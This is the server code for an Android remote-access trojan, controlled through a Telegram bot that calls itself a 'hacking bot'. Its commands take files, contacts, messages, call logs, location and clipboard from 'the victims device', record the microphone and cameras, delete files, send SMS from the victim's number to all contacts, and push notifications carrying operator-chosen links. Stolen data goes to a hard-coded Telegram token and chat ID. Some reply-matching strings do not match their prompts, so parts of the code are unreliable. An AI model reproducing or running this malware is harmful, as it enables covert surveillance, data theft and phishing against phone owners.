const express = require('express');
const webSocket = require('ws');
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const uuid4 = require('uuid')
const multer = require('multer');
const bodyParser = require('body-parser')
const axios = require("axios");

const token = '7980854565:AAHfgUYFfEPzHbOmVrMSyy63ROd7Bp1OvdY'
const id = '7823487580'
const address = 'https://www.google.com'

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map()

const upload = multer();
app.use(bodyParser.json());

let currentUuid = ''
let currentNumber = ''
let currentTitle = ''

app.get('/', function (req, res) {
    res.send('<h1 align="center">Bot Starting @cagffbot</h1>')
})

app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname
    appBot.sendDocument(id, req.file.buffer, {
            caption: `°• Message In <b>${req.headers.model}</b>`,
            parse_mode: "HTML"
        },
        {
            filename: name,
            contentType: 'application/txt',
        })
    res.send('')
})
app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `°• Message for<b>${req.headers.model}</b> phone\n\n`, {parse_mode: "HTML"})
    res.send('')
})
app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
    appBot.sendMessage(id, `°• Location For <b>${req.headers.model}</b> Phone`, {parse_mode: "HTML"})
    res.send('')
})
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4()
    const model = req.headers.model
    const battery = req.headers.battery
    const version = req.headers.version
    const brightness = req.headers.brightness
    const provider = req.headers.provider

    ws.uuid = uuid
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    })
    appBot.sendMessage(id,
        `°• New Phone\n\n` +
        `• Model Phone : <b>${model}</b>\n` +
        `• battery : <b>${battery}</b>\n` +
        `• Android Version : <b>${version}</b>\n` +
        `• Screen Brightness : <b>${brightness}</b>\n` +
        `• Provider : <b>${provider}</b>`,
        {parse_mode: "HTML"}
    )
    ws.on('close', function () {
        appBot.sendMessage(id,
            `°• No device connected \n\n` +
            `• Device Model : <b>${model}</b>\n` +
            `• Battery : <b>${battery}</b>\n` +
            `• Android Version : <b>${version}</b>\n` +
            `• Screen Brightness : <b>${brightness}</b>\n` +
            `• Provider : <b>${provider}</b>`,
            {parse_mode: "HTML"}
        )
        appClients.delete(ws.uuid)
    })
})
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (message.reply_to_message) {
        if (message.reply_to_message.text.includes('°• Please write the number you want to send to from the victims number ')) {
            currentNumber = message.text
            appBot.sendMessage(id,
                '°• Ok now write the message you want to send from the victims device to the number you wrote a moment ago. ...\n\n' +
                '• Be careful that the message will not be sent if the number of characters in your message is more than the allowed number, ',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('°• Ok now write the message you want to send from the victims device to the number you wrote a little while ago....')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message:${currentNumber}/${message.text}`)
                }
            });
            currentNumber = ''
            currentUuid = ''
            appBot.sendMessage(id,
                '°• Your request is being processed, please wait. ........\n\n' +
                '• You will receive a response in the next few moments @cagffbot ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Connected devices"], ["Execute the order"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• Please write the message you want to send to everyone. ')) {
            const message_to_all = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message_to_all:${message_to_all}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• Your request is being processed, please wait. .......\n\n' +
                '• please Wait @cagffbot',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Connected devices"], ["Execute the order"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• Enter the path of the file you want to extract from the victims device. ')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• Your request is being processed, please wait. .......\n\n' +
                '• please Wait @cagffbot',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Connected devices"], ["Execute the order"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• Enter the path of the file you want.')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`delete_file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• Your request is being processed, please wait. .......\n\n' +
                '• please Wait @cagffbot',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Connected devices"], ["Execute the order"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• Enter the duration for which you want to record the victim’s voice.  ')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`microphone:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• Your request is being processed, please wait. .......\n\n' +
                '• please Wait @cagffbot',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Connected devices"], ["Execute the order"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°•Enter the duration you want the front camera to record. ')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_main:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• Your request is being processed, please wait. .......\n\n' +
                '• please Wait @cagffbot',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Connected devices"], ["Execute the order"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes( '°• Enter the duration you want the victims selfie camera to record')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_selfie:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• Your request is being processed, please wait. .......\n\n' +
                '• please Wait @cagffbot',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Connected devices"], ["Execute the order"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• Enter the message you want to appear on the victims device')) {
            const toastMessage = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`toast:${toastMessage}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• Your request is being processed, please wait. .......\n\n' +
                '• please Wait @cagffbot',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Connected devices"], ["Execute the order"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• Enter the message you want to appear as a notification')) {
            const notificationMessage = message.text
            currentTitle = notificationMessage
            appBot.sendMessage(id, '°• Great, now enter the link you want to open by the notification\n\n' + '• When the victim clicks on the notification, the link you enter will be opened,',  
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('°• Great, now enter the link you want to open with the notification')) {
            const link = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`show_notification:${currentTitle}/${link}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• Your request is being processed, please wait. .......\n\n' +
                '• please Wait @cagffbot',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Connected devices"], ["Execute the order"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• Enter the link to the audio you want to play')) {
            const audioLink = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`play_audio:${audioLink}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• Your request is being processed, please wait. .......\n\n' +
                '• please Wait @cagffbot',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Connected devices"], ["Execute the order"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
    }
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id, '°• Welcome to the hacking bot Bot developer @cagffbot\n\n' + '• If the app is installed on the target device, wait for the connection\n\n' + '• When you get the connection message, it means the target device is connected and ready to receive the command\n\n' + '• Click on the command button and select the desired device and then specify the desired command between the command\n\n' + '• If you get stuck somewhere in the bot, send the /start command,', {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Connected devices"], ["Execute the order"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.text == 'Connected devices') {
            if (appClients.size == 0) {
                appBot.sendMessage(id, '°• No devices are connected and available\n\n' + '• Make sure the app is installed on the target device' )
            } else {
                let text = '°• List of Connected devices:\n\n'
                appClients.forEach(function (value, key, map) {
                    text += `• Device Model: <b>${value.model}</b> \n` + `• Battery: <b>${value.battery}</b> \n` + `• Android System: <b>${value.version}</b> \n` + `• Screen Surfaces: <b>${value.brightness}</b> \n` + `• Provider: <b>${value.provider}</b> \n\n` })
                appBot.sendMessage(id, text, {parse_mode: "HTML"})
            }
        }
        if (message.text == 'Execute the order') {
            if (appClients.size == 0) {
                appBot.sendMessage(id, '°• No devices are connected and available\n\n' + '• Make sure the app is installed on the target device' )
            } else {
                const deviceListKeyboard = []
                appClients.forEach(function (value, key, map) {
                    deviceListKeyboard.push([{
                        text: value.model,
                        callback_data: 'device:' + key
                    }])
                })
                appBot.sendMessage(id, '°• Select the device to execute commands on', {
                    "reply_markup": {
                        "inline_keyboard": deviceListKeyboard,
                    },
                })
            }
        }
    } else {
        appBot.sendMessage(id, '°• Permission request denied')
    }
})
appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data
    const commend = data.split(':')[0]
    const uuid = data.split(':')[1]
    console.log(uuid)
    if (commend == 'device') {
        appBot.editMessageText(`°• Set the praise for the device: <b>${appClients.get(data.split(':')[1]).model}</b> `, {
            width: 10000,
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: 'Apps', callback_data: `apps:${uuid}`},
                        {text: 'Device Info', callback_data: `device_info:${uuid}`}
                    ],
                    [
                        {text: 'Get File', callback_data: `file:${uuid}`},
                        {text: 'Delete File', callback_data: `delete_file:${uuid}`}
                    ],
                    [
                        {text: 'Clipboard', callback_data: `clipboard:${uuid}`},
                        {text: 'Microphone', callback_data: `microphone:${uuid}`},
                    ],
                    [
                        {text: 'Camera Main', callback_data: `camera_main:${uuid}`},
                        {text: 'Camera Selfie', callback_data: `camera_selfie:${uuid}`}
                    ],
                    [
                        {text: 'Location', callback_data: `location:${uuid}`},
                        {text: 'Toast', callback_data: `toast:${uuid}`}
                    ],
                    [
                        {text: 'Calls Histore', callback_data: `calls:${uuid}`},
                        {text: 'Contacts', callback_data: `contacts:${uuid}`}
                    ],
                    [
                        {text: 'Vibrate', callback_data: `vibrate:${uuid}`},
                        {text: 'Shoe Notification', callback_data: `show_notification:${uuid}`}
                    ],
                    [
                        {text: 'Messages', callback_data: `messages:${uuid}`},
                        {text: 'Send Message', callback_data: `send_message:${uuid}`}
                    ],
                    [
                        {text: 'Play Audio', callback_data: `play_audio:${uuid}`},
                        {text: 'Stop Audio', callback_data: `stop_audio:${uuid}`},
                    ],
                    [
                        {
                            text: 'Send Message To All Contacts',
                            callback_data: `send_message_to_all:${uuid}`
                        }
                    ],
                ]
            },
            parse_mode: "HTML"
        })
    }
    if (commend == 'calls') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('calls');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• Your request is being processed please wait.....nn' + '• You will receive a response in the next few moments Developer @cagffbot', {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Connected devices"], ["Execute the order"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'contacts') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('contacts');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• Your request is being processed please wait.....nn' + '• You will receive a response in the next few moments Developer @cagffbot', {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Connected devices"], ["Execute the order"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'messages') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('messages');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• Your request is being processed please wait.....nn' + '• You will receive a response in the next few moments Developer @cagffbot', {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Connected devices"], ["Execute the order"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'apps') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('apps');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• Your request is being processed please wait.....nn' + '• You will receive a response in the next few moments Developer @cagffbot', {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Connected devices"], ["Execute the order"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'device_info') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('device_info');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• Your request is being processed please wait.....nn' + '• You will receive a response in the next few moments Developer @cagffbot', {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Connected devices"], ["Execute the order"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'clipboard') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('clipboard');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• Your request is being processed please wait.....nn' + '• You will receive a response in the next few moments Developer @cagffbot', {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Connected devices"], ["Execute the order"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_main') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_main');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• Your request is being processed please wait.....nn' + '• You will receive a response in the next few moments Developer @cagffbot', {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Connected devices"], ["Execute the order"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_selfie') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_selfie');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• Your request is being processed please wait.....nn' + '• You will receive a response in the next few moments Developer @cagffbot', {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Connected devices"], ["Execute the order"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'location') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('location');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• Your request is being processed please wait.....nn' + '• You will receive a response in the next few moments Developer @cagffbot', {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Connected devices"], ["Execute the order"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'vibrate') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('vibrate');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• Your request is being processed please wait.....nn' + '• You will receive a response in the next few moments Developer @cagffbot', {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Connected devices"], ["Execute the order"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'stop_audio') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('stop_audio');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• Your request is being processed please wait.....nn' + '• You will receive a response in the next few moments Developer @cagffbot', {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Connected devices"], ["Execute the order"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'send_message') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• Please enter the number you want to send to from the victims number\n\n' + '• If you want to send SMS to local country numbers, you can enter the number with a zero at the beginning, otherwise enter the number with the country code,',
            {reply_markup: {force_reply: true}})
        currentUuid = uuid
    }
    if (commend == 'send_message_to_all') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• Please write the message you want to send to everyone\n\n' + '• Be careful that the message will not be sent if the number of characters in your message is more than the allowed number,',
            {reply_markup: {force_reply: true}}
        )
        currentUuid = uuid
    }
    if (commend == 'file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• Enter the path of the file you want to pull from the victims device\n\n' + '• You dont need to enter the full file path, just enter the root path. For example, enter <b>DCIM/Camera</b> to receive gallery files.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'delete_file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• Enter the path of the file you want \n\n' + '• You dont need to enter the full file path, just enter the main path. For example, enter <b>DCIM/Camera</b> to delete gallery files.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'microphone') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• Enter the path to the file you want \n\n' + '• Note that the time must be entered numerically in seconds,',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'toast') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• Enter the message you want to appear on the victims device\n\n' + '• It is a short message that appears on the devices screen for a few seconds,',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'show_notification') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• Enter the message you want to appear as a notification\n\n' + '• Your message will appear in the target devices status bar like a normal notification,',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'play_audio') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• °• Enter the link of the audio you want to play\n\n' + '• Note that you must enter the direct link of the desired audio, otherwise the audio will not be played,',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
});
setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping')
    });
    try {
        axios.get(address).then(r => "")
    } catch (e) {
    }
}, 5000)
appServer.listen(process.env.PORT || 8999);
